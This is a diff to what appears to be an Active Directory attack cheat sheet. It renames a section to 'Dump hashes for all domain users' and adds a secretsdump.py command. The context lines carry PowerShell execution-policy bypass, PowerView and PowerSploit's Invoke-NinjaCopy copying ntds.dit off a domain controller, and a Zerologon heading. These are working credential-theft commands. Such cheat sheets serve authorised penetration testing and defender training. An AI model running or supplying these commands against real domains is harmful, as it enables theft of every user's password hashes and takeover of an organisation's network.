@@ -250,7 +250,7 @@ dsquery * “cn=subnets,cn=sites,cn=configuration,dc=<something>,dc=<int>” -at
 dsquery partition
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Dump the DC database
+# Dump hashes for all domain users
 
 powershell -nop -exec bypass
 Import-Module PowerView
@@ -266,6 +266,9 @@ Get-NetDomainController
 Import-Module PowerSploit
 Invoke-NinjaCopy -Path C:\windows\ntds\ntds.dit -LocalDistination C:\ntds.dit -ComputerName <DC name>
 ls
+
+- Example 2
+python secretsdump.py acme.org/<user@dc name>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Zerologon CVE-2020-1472
